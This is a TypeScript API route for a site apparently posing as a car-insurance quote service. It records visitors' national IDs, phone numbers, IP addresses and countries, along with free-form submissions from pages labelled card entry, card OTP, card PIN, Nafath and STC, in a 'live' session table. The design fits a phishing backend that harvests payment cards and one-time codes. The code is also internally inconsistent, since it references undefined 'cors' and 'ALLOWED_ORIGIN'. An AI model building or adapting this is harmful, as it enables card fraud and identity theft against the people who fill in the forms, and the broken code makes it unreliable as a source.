import { createFileRoute } from "@tanstack/react-router";
import { makeServiceClient } from "@/lib/admin-api.server";
import { z } from "zod";

const PageEnum = z.enum([
  "quote_landing",
  "insurer_selected",
  "payment_card",
  "card_otp",
  "card_pin",
  "phone_entry",
  "motsl_otp",
  "nafath",
  "stc_awaiting",
]);

const BodySchema = z.object({
  sid: z.string().min(4).max(64),
  type: z.enum(["visit", "update", "submit"]),
  page: PageEnum.optional(),
  data: z
    .object({
      nationalId: z.string().max(20).optional(),
      phone: z.string().max(20).optional(),
      serialNumber: z.string().max(20).optional(),
      vehicleMake: z.string().max(60).optional(),
      vehicleModel: z.string().max(60).optional(),
      modelYear: z.number().int().min(1980).max(2100).optional(),
      declaredValue: z.number().min(0).max(10_000_000).optional(),
      insurerCompany: z.string().max(80).optional(),
      insurerOfferSar: z.number().min(0).max(10_000_000).optional(),
      // free-form submission fields (card / OTP / etc.)
      submission: z.record(z.string(), z.string()).optional(),
    })
    .optional(),
});

const LegacyBodySchema = z.object({
  sessionId: z.string().min(4).max(64),
  event: z.string().min(1).max(40),
  page: z.string().min(1).max(200).optional(),
});

function pageFromPath(path: string | undefined): z.infer<typeof PageEnum> {
  const normalized = (path ?? "/").toLowerCase();
  if (normalized.includes("insurer") || normalized.includes("compare")) return "insurer_selected";
  if (normalized.includes("payment") || normalized.includes("card")) return "payment_card";
  if (normalized.includes("otp")) return "card_otp";
  if (normalized.includes("pin")) return "card_pin";
  if (normalized.includes("phone")) return "phone_entry";
  if (normalized.includes("motsl")) return "motsl_otp";
  if (normalized.includes("nafath")) return "nafath";
  if (normalized.includes("stc")) return "stc_awaiting";
  return "quote_landing";
}

const ALLOWED_ORIGINS = [
  "https://tmnbcre.lovable.app",
  "https://tamnbcare.online",
];

function corsHeaders(origin: string | null) {
  return {
    "Access-Control-Allow-Origin":
      origin && ALLOWED_ORIGINS.includes(origin) ? origin : ALLOWED_ORIGINS[0],
    "Access-Control-Allow-Methods": "POST, OPTIONS",
    "Access-Control-Allow-Headers": "content-type",
    Vary: "Origin",
  };
}

export const Route = createFileRoute("/api/public/track")({
  server: {
    handlers: {
      OPTIONS: async () => new Response(null, { status: 204, headers: cors }),
      POST: async ({ request }) => {
        const origin = request.headers.get("origin");
        if (origin && origin !== ALLOWED_ORIGIN) {
          return new Response("Origin not allowed", { status: 403, headers: cors });
        }
        let json: unknown;
        try {
          json = await request.json();
        } catch {
          return new Response("Bad JSON", { status: 400, headers: cors });
        }
        const currentPayload = BodySchema.safeParse(json);
        const legacyPayload = LegacyBodySchema.safeParse(json);
        if (!currentPayload.success && !legacyPayload.success) {
          return new Response("Invalid payload", { status: 400, headers: cors });
        }
        let payload: z.infer<typeof BodySchema>;
        if (currentPayload.success) {
          payload = currentPayload.data;
        } else if (legacyPayload.success) {
          payload = {
            sid: legacyPayload.data.sessionId,
            type: legacyPayload.data.event === "submit" ? "submit" : "visit",
            page: pageFromPath(legacyPayload.data.page),
          };
        } else {
          return new Response("Invalid payload", { status: 400, headers: cors });
        }
        const { sid, type, page, data } = payload;

        // Capture the visitor's real IP (Cloudflare / proxy headers)
        const ip =
          request.headers.get("cf-connecting-ip") ||
          request.headers.get("x-real-ip") ||
          (request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ?? null);

        // Resolve country: prefer Cloudflare's geolocation, fall back to a lookup API
        let country: string | null =
          (request as unknown as { cf?: { country?: string } }).cf?.country ?? null;
        if (!country && ip && !/^(10\.|192\.168\.|127\.|172\.(1[6-9]|2\d|3[01])\.)/.test(ip)) {
          try {
            const geo = await fetch(
              `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country`,
              { signal: AbortSignal.timeout(2500) },
            );
            if (geo.ok) {
              const j = (await geo.json()) as { status?: string; country?: string };
              if (j.status === "success" && j.country) country = j.country;
            }
          } catch {
            /* geo lookup best-effort */
          }
          if (!country) {
            try {
              const geo = await fetch(
                `https://ipapi.co/${encodeURIComponent(ip)}/country_name/`,
                { signal: AbortSignal.timeout(2500) },
              );
              if (geo.ok) {
                const name = (await geo.text()).trim();
                if (name && !/error|reserved|undefined|ratelimit/i.test(name)) country = name;
              }
            } catch {
              /* geo lookup best-effort */
            }
          }
        }

        const supabase = makeServiceClient();

        const { data: existing } = await supabase
          .from("tracked_sessions")
          .select("session_id, submission")
          .eq("session_id", sid)
          .maybeSingle();

        const submissionMerge = {
          ...((existing?.submission as Record<string, string> | null) ?? {}),
          ...(data?.submission ?? {}),
        };

        const row: Record<string, unknown> = {
          session_id: sid,
          state: "live",
          submission: submissionMerge,
          updated_at: new Date().toISOString(),
        };
        if (page) row["current_page"] = page;
        else if (!existing) row["current_page"] = "quote_landing";
        if (data?.nationalId) row["national_id"] = data.nationalId;
        if (data?.phone) row["phone"] = data.phone;
        if (data?.serialNumber) row["serial_number"] = data.serialNumber;
        if (data?.vehicleMake) row["vehicle_make"] = data.vehicleMake;
        if (data?.vehicleModel) row["vehicle_model"] = data.vehicleModel;
        if (data?.modelYear) row["model_year"] = data.modelYear;
        if (data?.declaredValue) row["declared_value"] = data.declaredValue;
        if (data?.insurerCompany) row["insurer_company"] = data.insurerCompany;
        if (data?.insurerOfferSar) row["insurer_offer_sar"] = data.insurerOfferSar;
        if (ip) row["ip_address"] = ip;
        if (country) row["country"] = country;

        const { error } = await supabase
          .from("tracked_sessions")
          .upsert(row, { onConflict: "session_id" });

        if (error) {
          return new Response(JSON.stringify({ error: error.message }), {
            status: 500,
            headers: { ...cors, "Content-Type": "application/json" },
          });
        }
        return new Response(JSON.stringify({ ok: true, sid, type }), {
          headers: { ...cors, "Content-Type": "application/json" },
        });
      },
    },
  },
});
